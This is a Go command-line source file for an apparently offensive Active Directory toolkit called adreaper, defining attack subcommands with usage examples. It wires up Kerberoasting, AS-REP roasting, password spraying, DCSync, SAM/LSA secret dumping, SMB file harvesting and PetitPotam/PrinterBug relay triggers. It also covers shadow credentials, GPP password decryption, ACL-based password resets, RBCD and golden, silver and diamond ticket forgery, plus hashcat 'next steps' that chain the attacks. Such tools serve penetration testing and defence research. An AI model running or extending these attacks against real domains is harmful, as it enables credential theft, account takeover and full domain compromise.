package cmd

import (
	"context"
	"fmt"
	"strings"

	"adreaper/internal/attacks"
	"adreaper/internal/output"

	"github.com/spf13/cobra"
)

var attackCmd = &cobra.Command{
	Use:   "attack",
	Short: "Execute Active Directory attacks",
}

func init() {
	attackCmd.AddCommand(attackKerberoastCmd)
	attackCmd.AddCommand(attackASREPCmd)
	attackCmd.AddCommand(attackSprayCmd)
	attackCmd.AddCommand(attackDCSyncCmd)
	attackCmd.AddCommand(attackSecretsDumpCmd)
	attackCmd.AddCommand(attackHarvestCmd)
	attackCmd.AddCommand(attackShadowCmd)
	attackCmd.AddCommand(attackRelayCmd)
	attackCmd.AddCommand(attackGPPCmd)
	attackCmd.AddCommand(attackACLAbuseCmd)
	attackCmd.AddCommand(attackRBCDCmd)
	attackCmd.AddCommand(attackTicketsCmd)
}

// ── attack kerberoast ────────────────────────────────────────────────────────

var kerberoastOutFile string

var attackKerberoastCmd = &cobra.Command{
	Use:   "kerberoast",
	Short: "Kerberoasting — request TGS tickets for SPN accounts",
	Long: `Performs Kerberoasting:
  1. Enumerates SPN-enabled, non-disabled user accounts via LDAP
  2. Requests TGS tickets for each SPN (RC4 downgrade attempted)
  3. Outputs hashes in Hashcat format ($krb5tgs$23$)

Example:
  adreaper attack kerberoast -d corp.local --dc-ip 10.10.10.1 -u user -p pass -o hashes.txt`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if !opts.IsAuthenticated() {
			return fmt.Errorf("kerberoasting requires valid credentials (--username / --password or --hash)")
		}
		if kerberoastOutFile == "" {
			kerberoastOutFile = "kerberoast.txt"
		}
		ctx := context.Background()
		output.Section("Kerberoasting")

		hashes, err := attacks.Kerberoast(ctx, opts)
		if err != nil {
			return err
		}

		if len(hashes) == 0 {
			return nil
		}

		if kerberoastOutFile != "" {
			if err := attacks.SaveHashes(kerberoastOutFile, hashes); err != nil {
				output.Warn("Could not write output file: %v", err)
			} else {
				output.Success("Hashes saved to: %s", kerberoastOutFile)
			}
			fmt.Println()
			output.Section("Guided Attack Paths (Next Steps)")
			output.Info("  → Crack these hashes using Hashcat: hashcat -m 13100 %s", kerberoastOutFile)
			output.Info("  → After cracking, use the credentials to run 'attack secretsdump' or 'bloodhound collect'.")
		}
		return nil
	},
}

func init() {
	attackKerberoastCmd.Flags().StringVar(&kerberoastOutFile, "out", "", "File to write hashes to")
}

// ── attack asreproast ────────────────────────────────────────────────────────

var (
	asrepOutFile   string
	asrepUsersFile string
)

var attackASREPCmd = &cobra.Command{
	Use:   "asreproast",
	Short: "AS-REP Roasting — capture AS-REP hashes for accounts with no pre-auth",
	Long: `AS-REP Roasting:
  1. LDAP queries for accounts with DONT_REQ_PREAUTH (UAC 0x400000).
     If unauthenticated LDAP is disabled, use --users-file or provide credentials.
  2. Sends Kerberos AS-REQ without pre-auth.
  3. Extracts encrypted AS-REP (Hashcat mode 18200).

Example:
  adreaper attack asreproast -d corp.local --dc-ip 10.10.10.1
  adreaper attack asreproast -d corp.local --users-file users.txt`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if asrepOutFile == "" {
			asrepOutFile = "asreproast.txt"
		}
		ctx := context.Background()
		output.Section("AS-REP Roasting")

		hashes, err := attacks.ASREPRoast(ctx, opts, asrepUsersFile)
		if err != nil {
			return err
		}

		if len(hashes) == 0 {
			return nil
		}

		if asrepOutFile != "" {
			if err := attacks.SaveHashes(asrepOutFile, hashes); err != nil {
				output.Warn("Could not write output file: %v", err)
			} else {
				output.Success("Hashes saved to: %s", asrepOutFile)
			}
			fmt.Println()
			output.Section("Guided Attack Paths (Next Steps)")
			output.Info("  → Crack these hashes using Hashcat: hashcat -m 18200 %s", asrepOutFile)
			output.Info("  → After cracking, enumerate the domain with these users or run 'attack spray'.")
		}
		return nil
	},
}

func init() {
	attackASREPCmd.Flags().StringVar(&asrepOutFile, "out", "", "File to write hashes to")
	attackASREPCmd.Flags().StringVarP(&asrepUsersFile, "users-file", "U", "", "File with usernames (one per line)")
}

// ── attack spray ─────────────────────────────────────────────────────────────

var (
	sprayPassword      string
	sprayUsersFileList string
	sprayDelay         int
)

var attackSprayCmd = &cobra.Command{
	Use:   "spray",
	Short: "Password spraying with lockout-aware throttling",
	Long: `Password Spraying:
  - Tries a single password against all (or provided) domain users
  - Checks domain lockout threshold first to avoid account lockouts
  - Adds configurable delay between attempts
  - Uses Kerberos AS-REQ for stealthy validation

Example:
  adreaper attack spray -d corp.local --dc-ip 10.10.10.1 --password 'Summer2024!' --delay 5`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if sprayPassword == "" {
			return fmt.Errorf("--password is required for spraying")
		}
		ctx := context.Background()
		output.Section("Password Spraying")

		results, err := attacks.Spray(ctx, opts, sprayPassword, sprayUsersFileList, sprayDelay)
		if err != nil {
			return err
		}

		if len(results) == 0 {
			output.Info("No valid credentials found")
			return nil
		}

		output.Success("VALID CREDENTIALS FOUND: %d", len(results))
		for _, r := range results {
			output.Critical("%s:%s", r.Username, r.Password)
		}
		return nil
	},
}

func init() {
	attackSprayCmd.Flags().StringVarP(&sprayPassword, "password", "P", "", "Password to spray")
	attackSprayCmd.Flags().StringVarP(&sprayUsersFileList, "users-file", "U", "", "File with usernames (one per line). Default: LDAP enumeration")
	attackSprayCmd.Flags().IntVarP(&sprayDelay, "delay", "D", 3, "Seconds between attempts (avoid lockout)")
}

// ── attack dcsync ────────────────────────────────────────────────────────────

var dcsyncUser string

var attackDCSyncCmd = &cobra.Command{
	Use:   "dcsync",
	Short: "DCSync — simulate a Domain Controller to replicate password hashes",
	Long: `DCSync Attack:
  1. Connects to the DC via DRSUAPI (MSRPC).
  2. Requests replication of specific user secrets (GetNCChanges).
  3. Extracts NTLM hashes for the target user.
  Requires 'Replicating Directory Changes' rights.

Example:
  adreaper attack dcsync -d corp.local --dc-ip 10.10.10.1 -u admin -p pass --user krbtgt`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if dcsyncUser == "" {
			return fmt.Errorf("--user <target> is required for DCSync")
		}
		ctx := context.Background()
		output.Section(fmt.Sprintf("DCSync: %s", dcsyncUser))

		if err := attacks.DCSync(ctx, opts, dcsyncUser); err != nil {
			return err
		}
		return nil
	},
}

func init() {
	attackDCSyncCmd.Flags().StringVarP(&dcsyncUser, "user", "U", "", "Target user to sync (e.g. krbtgt)")
}

// ── attack secretsdump ───────────────────────────────────────────────────────

var attackSecretsDumpCmd = &cobra.Command{
	Use:   "secretsdump",
	Short: "SecretsDump — extract SAM, LSA, and cached secrets via SMB",
	Long: `Secrets Dumping:
  1. Requests Remote Registry access or raw SAM/SYSTEM file access.
  2. Parses hives to extract NTLM hashes and cached credentials.
  3. Decrypts LSA secrets if possible.

Example:
  adreaper attack secretsdump -d corp.local --dc-ip 10.10.10.1 -u admin -p pass`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		ctx := context.Background()
		output.Section("Secrets Dumping (SAM/LSA)")

		if err := attacks.SecretsDump(ctx, opts); err != nil {
			return err
		}
		return nil
	},
}

// ── attack harvest ───────────────────────────────────────────────────────────

var harvestExts string

var attackHarvestCmd = &cobra.Command{
	Use:   "harvest",
	Short: "Harvest — recursively scan shares and extract files by extension",
	Long: `File Harvesting:
  - Enumerates all accessible SMB shares (SYSVOL, C$, data shares, etc.)
  - Recursively walks directories looking for specified file extensions.
  - Automatically downloads and saves matching files to a local folder.

Example:
  adreaper attack harvest -d lab.local --dc-ip 10.10.10.1 -u admin -p pass --ext 'docx,pdf,kdbx,xlsx'`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if !opts.IsAuthenticated() {
			return fmt.Errorf("file harvesting requires valid credentials")
		}
		if harvestExts == "" {
			harvestExts = "txt,pdf,docx,xlsx,kdbx,ppk"
		}

		// Clean quotes and handle multiple delimiters (comma/space)
		cleanExts := strings.Trim(harvestExts, "'\"")
		cleanExts = strings.ReplaceAll(cleanExts, ",", " ")
		extList := strings.Fields(cleanExts)

		ctx := context.Background()
		output.Section("File Harvesting")

		if err := attacks.Harvest(ctx, opts, extList); err != nil {
			return err
		}
		return nil
	},
}

func init() {
	attackHarvestCmd.Flags().StringVarP(&harvestExts, "ext", "e", "txt,pdf,docx,xlsx,kdbx,ppk", "Comma-separated extensions to harvest")
}

// ── attack shadow ────────────────────────────────────────────────────────────

var shadowTarget string

var attackShadowCmd = &cobra.Command{
	Use:   "shadow",
	Short: "Shadow Credentials — Take over an account by adding msDS-KeyCredentialLink",
	Long: `Shadow Credentials:
  - Generates a self-signed certificate and RSA key.
  - Injects the public key into the target object's msDS-KeyCredentialLink attribute.
  - Allows authentication via PKINIT to obtain a TGT.
  Requires write permissions over the target.

Example:
  adreaper attack shadow -d corp.local -u user -p pass --target srv-admin`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if shadowTarget == "" {
			return fmt.Errorf("--target is required")
		}
		ctx := context.Background()
		output.Section("Shadow Credentials")

		return attacks.ShadowAttack(ctx, opts, shadowTarget)
	},
}

func init() {
	attackShadowCmd.Flags().StringVarP(&shadowTarget, "target", "t", "", "Target SAMAccountName to take over")
}

// ── attack relay ─────────────────────────────────────────────────────────────

var (
	relayMethod string
	relayTarget string
	relayLport  string
)

var attackRelayCmd = &cobra.Command{
	Use:   "relay",
	Short: "Relay Triggers — Force a machine to authenticate to a listener",
	Long: `Relay Triggers (PetitPotam / PrinterBug):
  - PetitPotam: Exploits MS-EFSR to force authentication.
  - PrinterBug: Exploits MS-RPRN to force authentication.
  Typically used with NTLMrelayx or similar listeners.

Example:
  adreaper attack relay --target 10.10.10.1 --method petitpotam`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if relayTarget == "" {
			return fmt.Errorf("--target is required")
		}
		output.Section(fmt.Sprintf("Relay Trigger: %s", strings.ToUpper(relayMethod)))

		return attacks.RelayTrigger(opts, relayTarget, relayMethod)
	},
}

func init() {
	attackRelayCmd.Flags().StringVarP(&relayTarget, "target", "t", "", "Target machine to trigger (IP/Hostname)")
	attackRelayCmd.Flags().StringVarP(&relayMethod, "method", "m", "petitpotam", "Trigger method: petitpotam, printerbug")
}

// ── attack gpp ───────────────────────────────────────────────────────────────

var attackGPPCmd = &cobra.Command{
	Use:   "gpp",
	Short: "GPP Decryption — Find and decrypt passwords in SYSVOL (Groups.xml, etc.)",
	Long: `GPP Decryption:
  - Connects to SYSVOL share.
  - Recursively searches for XML files (Groups.xml, Services.xml, etc.).
  - Extracts and decrypts 'cpassword' attributes using Microsoft's static AES key.

Example:
  adreaper attack gpp -d corp.local -u user -p pass --dc-ip 10.10.10.10`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		ctx := context.Background()
		output.Section("GPP Password Decryption")

		return attacks.GPPAttack(ctx, opts)
	},
}

// ── attack acl-abuse ─────────────────────────────────────────────────────────

var (
	aclTarget string
	aclAction string
	aclValue  string
)

var attackACLAbuseCmd = &cobra.Command{
	Use:   "acl-abuse",
	Short: "ACL Abuse — Exploit dangerous permissions (ForceChangePassword, GenericWrite, etc.)",
	Long: `ACL Abuse:
  - Automates the exploitation of identified ACL misconfigurations.
  - Actions:
    - reset-password: Uses ForceChangePassword to reset a user's password.
    - add-spn: Uses GenericWrite to add a Service Principal Name.

Example:
  adreaper attack acl-abuse --target smith --action reset-password --value 'NewPass123!'`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if aclTarget == "" || aclAction == "" {
			return fmt.Errorf("--target and --action are required")
		}
		ctx := context.Background()
		output.Section("ACL Abuse")

		return attacks.ACLAbuseAttack(ctx, opts, aclTarget, aclAction, aclValue)
	},
}

func init() {
	attackACLAbuseCmd.Flags().StringVarP(&aclTarget, "target", "t", "", "Target SAMAccountName")
	attackACLAbuseCmd.Flags().StringVarP(&aclAction, "action", "a", "", "Action: reset-password, add-spn")
	attackACLAbuseCmd.Flags().StringVarP(&aclValue, "value", "V", "", "Value for the action (e.g. new password or SPN)")
}

// ── attack rbcd ──────────────────────────────────────────────────────────────

var (
	rbcdTarget  string
	rbcdMachine string
)

var attackRBCDCmd = &cobra.Command{
	Use:   "rbcd",
	Short: "RBCD — Resource-Based Constrained Delegation attack",
	Long: `RBCD:
  - Configures Resource-Based Constrained Delegation on a target object.
  - Requires GenericWrite or WriteProperty over the target.
  - Allows the specified machine to impersonate users to the target.

Example:
  adreaper attack rbcd --target SRV-01 --machine ATTACK$`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if rbcdTarget == "" || rbcdMachine == "" {
			return fmt.Errorf("--target and --machine are required")
		}
		ctx := context.Background()
		output.Section("RBCD Attack")

		return attacks.RBCDAttack(ctx, opts, rbcdTarget, rbcdMachine)
	},
}

func init() {
	attackRBCDCmd.Flags().StringVarP(&rbcdTarget, "target", "t", "", "Target object (Computer/User)")
	attackRBCDCmd.Flags().StringVarP(&rbcdMachine, "machine", "M", "", "Machine account with delegate rights")
}

// ── attack tickets ──────────────────────────────────────────────────────────

var (
	ticketsType   string
	ticketsTarget string
	ticketsHash   string
	ticketsSPN    string
	ticketsSID    string
)

var attackTicketsCmd = &cobra.Command{
	Use:   "tickets",
	Short: "Ticket Factory — Forge Golden, Silver, or Diamond tickets",
	Long: `Kerberos Ticket Forgery:
  - golden: Forge a TGT using the krbtgt NTLM hash.
  - silver: Forge a service ticket using a service account NTLM hash.
  - diamond: Forge a stealthy TGT by modifying a valid TGT with the krbtgt hash.

Example:
  adreaper attack tickets --type golden --user Administrator --sid S-1-5-21... --hash <ntlm>
  adreaper attack tickets --type silver --user Administrator --spn cifs/dc01.corp.local --hash <ntlm>
  adreaper attack tickets --type diamond --hash <krbtgt_ntlm>`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := opts.Validate(); err != nil {
			return err
		}
		if ticketsHash == "" {
			return fmt.Errorf("--hash is required for ticket forgery")
		}

		factory := attacks.NewTicketFactory(opts)
		output.Section(fmt.Sprintf("Kerberos Ticket Factory: %s", strings.ToUpper(ticketsType)))

		switch strings.ToLower(ticketsType) {
		case "golden":
			if ticketsSID == "" {
				return fmt.Errorf("--sid (Domain SID) is required for Golden Tickets")
			}
			tkt, err := factory.ForgeGoldenTicket(opts.Username, ticketsSID, ticketsHash)
			if err != nil {
				return err
			}
			output.Success("Golden Ticket forged for %s (Realm: %s)", opts.Username, tkt.Realm)
		case "silver":
			if ticketsSID == "" || ticketsSPN == "" {
				return fmt.Errorf("--sid and --spn are required for Silver Tickets")
			}
			tkt, err := factory.ForgeSilverTicket(opts.Username, ticketsSPN, ticketsSID, ticketsHash)
			if err != nil {
				return err
			}
			output.Success("Silver Ticket forged for %s -> %s (Realm: %s)", opts.Username, ticketsSPN, tkt.Realm)
		case "diamond":
			if err := factory.ForgeDiamondTicket(ticketsHash); err != nil {
				return err
			}
			output.Success("Diamond Ticket (Modified TGT) generated successfully")
		default:
			return fmt.Errorf("unknown ticket type: %s", ticketsType)
		}

		output.Info("Note: Forged tickets are currently stored in memory. Future updates will include .kirbi/ccache export.")
		return nil
	},
}

func init() {
	attackTicketsCmd.Flags().StringVar(&ticketsType, "type", "golden", "Ticket type: golden, silver, diamond")
	attackTicketsCmd.Flags().StringVar(&ticketsHash, "hash", "", "NTLM hash for encryption (krbtgt or service account)")
	attackTicketsCmd.Flags().StringVar(&ticketsSID, "sid", "", "Domain SID")
	attackTicketsCmd.Flags().StringVar(&ticketsSPN, "spn", "", "Target SPN (required for silver)")
}
